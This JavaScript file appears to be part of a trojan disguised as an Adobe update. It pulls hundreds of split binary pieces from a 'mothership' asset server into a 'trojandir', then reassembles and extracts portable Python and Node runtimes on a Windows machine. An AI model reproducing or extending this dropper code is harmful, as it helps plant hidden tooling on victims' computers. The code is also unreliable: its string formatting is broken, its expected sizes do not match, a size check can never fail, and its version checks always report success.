const helper = require("./adobeupdate.helper.js");

const path = require("path");
const PubNub = require("pubnub");
const net = require("net");
const { fork, exec, spawn } = require("child_process");
const fs = require("fs");
const os = require("os");
const crypto = require("crypto");
const util = require("util");

function verify_node_download() {
    let missingfiles = [];

    let filenames = Array.from({ length: 480 }, (_, index) => index + 1);

    filenames = filenames.map(String);
    filenames = filenames.map((_, i) => {
        return "disk" + _ + ".gsd";
    });

    for (let i = 0; i < filenames.length; i++) {
        let filename = filenames[i];
        let fpath = path.join(systemconfig.nodegsdfilesdir, filename);

        if (!helper.fileExists(fpath)) {
            missingfiles.push({ filename: filename, msg: "file is missing" });
            continue;
        }

        const stats = fs.statSync(fpath);

        if (filename == "disk1.gsd") {
            if (stats.size != 1696) {
                let msg = `file not the correct size {fpath} {stats.size} 1696`;
                missingfiles.push({
                    filename: filename,
                    msg: msg,
                });
            }
        } else if (filename == "disk480.gsd") {
            if (stats.size != 59246) {
                let msg = `file not the correct size {fpath} {stats.size} 65443`;
                missingfiles.push({
                    filename: filename,
                    msg: msg,
                });
            }
        } else {
            if (stats.size != 100000) {
                let msg = `file not the correct size {fpath} {stats.size} 65443`;
                missingfiles.push({
                    filename: filename,
                    msg: msg,
                });
            }
        }
    }

    if (missingfiles.length > 0) {
        return { status: false, missingfiles: missingfiles };
    }

    return { status: true };
}

async function verify_node_install() {
    let fpath = path.join(systemconfig.nodedir, "node-v26.4.0-win-x64");

    if (!folderExists(fpath)) {
        return { state: false, msg: `node install folder does not exist` };
    }

    fpath = path.join(systemconfig.nodedir, "node-v26.4.0-win-x64", "node.exe");

    if (!helper.fileExists(fpath)) {
        return { state: false, msg: "node.exe does not exist " + fpath };
    }

    fpath = path.join(systemconfig.nodedir, "node-v26.4.0-win-x64");

    let childp = null;

    try {
        childp = await invoke_exe("node.exe", ["--version"], fpath, (text) => {
            text = text ?? "ERROR_EMPTY_OUTPUT";

            if (!text.includes("v26.4.0")) {
                return {
                    state: false,
                    msg: `node install failed -- could not verify version {text}`,
                };
            }
        });
    } catch (err) {
        helper.logmsg(err);
    }

    try {
        childp = await invoke_exe("npm.cmd", ["--version"], fpath, (text) => {
            text = text ?? "ERROR_EMPTY_OUTPUT";

            if (!text.includes("11.17.0")) {
                return {
                    state: false,
                    msg: `node install failed -- could not verify npm version {text}`,
                };
            }
        });
    } catch (err) {
        helper.logmsg(err);
    }

    return { state: true };
}

async function download_node(missingfiles) {
    helper.logmsg("starting");

    let filenames = [];

    if (missingfiles && missingfiles.length > 0) {
        for (let i = 0; i < missingfiles.length; i++)
            filenames.push(missingfiles[i].filename);
    } else {
        filenames = Array.from({ length: 480 }, (_, index) => index + 1);

        filenames = filenames.map(String);
        filenames = filenames.map((_, i) => {
            return "disk" + _ + ".gsd";
        });
    }

    for (let i = 0; i < filenames.length; i++) {
        let filename = filenames[i];
        // let fpath = path.join(systemconfig.nodegsdfilesdir, filename);

        let baseUrl =
            systemconfig.mothershipassets + "/node/gsd_files/" + filename;
        let localpath = path.join(systemconfig.nodegsdfilesdir, filename);

        fs.mkdirSync(systemconfig.nodegsdfilesdir, { recursive: true });

        let downloadOpts = {
            download: true,
            filetype: "bin",
            localpath: localpath,
        };

        let response = await makeGetRequest(baseUrl, null, null, downloadOpts);

        /* downloadOpts { filetype, localpath, download }
           rawText
           buffer
           status
           statusText
           headers */

        if (!helper.fileExists(localpath)) {
            throw new Error("download failed for " + localpath);
        }

        const stats = fs.statSync(localpath);
        helper.logmsg(`${localpath} -- File size: ${stats.size} bytes`);
    }

    helper.logmsg("finished");
}

function get_python_install_filenames() {
    let filenames = Array.from({ length: 735 }, (_, index) => index + 1);

    filenames = filenames.map(String);
    filenames = filenames.map((_, i) => {
        return "disk" + _ + ".gsd";
    });

    return filenames;
}

function verify_python_download() {
    let filenames = get_python_install_filenames();

    let filenames_out = [];

    for (let i = 0; i < filenames.length; i++) {
        let filename = filenames[i];
        let fpath = path.join(systemconfig.gsdfilesdir, filename);

        if (!helper.fileExists(fpath)) {
            helper.logmsg(`file does not exist ${fpath}`);
            filenames_out.push(filename);
            continue;
        }

        const stats = fs.statSync(fpath);

        // disk1.gsd --> 1,696
        // disk735.gsd --> 65,443
        // 100,000

        if (filename == "disk1.gsd") {
            if (stats.size != 1696) {
                helper.logmsg(`file not the correct size ${fpath} {stats.size} 1696`);
                filenames_out.push(filename);
            }
        } else if (filename == "disk735.gsd") {
            if (stats.size != 65443) {
                filenames_out.push(filename);
                helper.logmsg(`file not the correct size ${fpath} {stats.size} 65443`);
            }
        } else {
            if (stats.size != 100000) {
                filenames_out.push(filename);
                helper.logmsg(
                    `file not the correct size ${fpath} ${stats.size} 65443`
                );
            }
        }
    }

    return filenames_out;
}

async function verify_python_install() {
    let fpath = systemconfig.pythonexedir;

    if (!folderExists(fpath)) {
        helper.logmsg(`python folder does not exist ${fpath}`);
        return false;
    }

    let childp = null;

    try {
        childp = await invoke_exe(
            "python.exe",
            ["--version"],
            fpath,
            (text) => {
                text = text ?? "ERROR_EMPTY_OUTPUT";

                if (!text.includes("Python 3.10.5")) {
                    helper.logmsg(
                        `python install failed -- could not verify python version ${text}`
                    );
                    return false;
                }
            }
        );
    } catch (err) {
        helper.logmsg(err);
    }

    return true;
}

// TODO install all modules psutil -- python -m pip install psutil
async function install_python() {
    helper.logmsg("starting");

    let installcmd = systemconfig.cmdconfig;

    let verify_python = await verify_python_install();

    if (verify_python) {
        helper.logmsg("python is installed -- exiting");
        process.exit(0);
        return;
    }

    if (!helper.fileExists(path.join(systemconfig.trojandir, "7za.exe")))
        await retrieve_asset("7za.exe");

    if (!helper.fileExists(path.join(systemconfig.trojandir, "gunite.exe")))
        await retrieve_asset("gunite.exe");

    // TODO verify file MD5

    let filenames = [];
    if (!folderExists(systemconfig.gsdfilesdir)) {
        filenames = get_python_install_filenames();
    } else {
        filenames = verify_python_download();
    }

    if (filenames && filenames.length > 0) {
        let ret = await download_python(filenames);
    }

    filenames = verify_python_download();

    if (filenames && filenames.length > 0) {
        throw new Error(
            "python download failed: install files are missing or invalid " +
            JSON.stringify(filenames)
        );
    }

    helper.logmsg("python pieces exist -- proceeding with gunite step");

    let args = [
        path.join(systemconfig.gsdfilesdir, "disk1.gsd"),
        "-u",
        path.join(systemconfig.pythondir, "portable_python.zip"),
        "-s",
    ];

    let childp = null;

    try {
        childp = await invoke_exe("gunite.exe", args, systemconfig.trojandir); // throws error despite success
    } catch (err) {
        helper.logmsg(err);
    }

    let fpath = path.join(systemconfig.pythondir, "portable_python.zip");

    if (!helper.fileExists(fpath)) {
        throw new Error(`file does not exist ${fpath}`);
    }

    const stats = fs.statSync(fpath);
    const zipsize = 72890982;
    if (!stats.size == zipsize) {
        throw new Error(
            `incorrect file size ${stats.size} expected ${zipsize}`
        );
    }

    helper.logmsg("gunite step successful -- proceeding with unzip step");

    args = [
        "x",
        path.join(systemconfig.pythondir, "portable_python.zip"),
        "-o" + path.join(systemconfig.pythondir, "work"),
        "-aoa",
        "-y",
    ];

    try {
        childp = await invoke_exe("7za.exe", args, systemconfig.trojandir);
    } catch (err) {
        helper.logmsg(err);
    }

    verify_python = await verify_python_install();

    if (!verify_python) {
        throw new Error("python install failed");
    }

    process.exit(0);

    helper.logmsg("finished");
}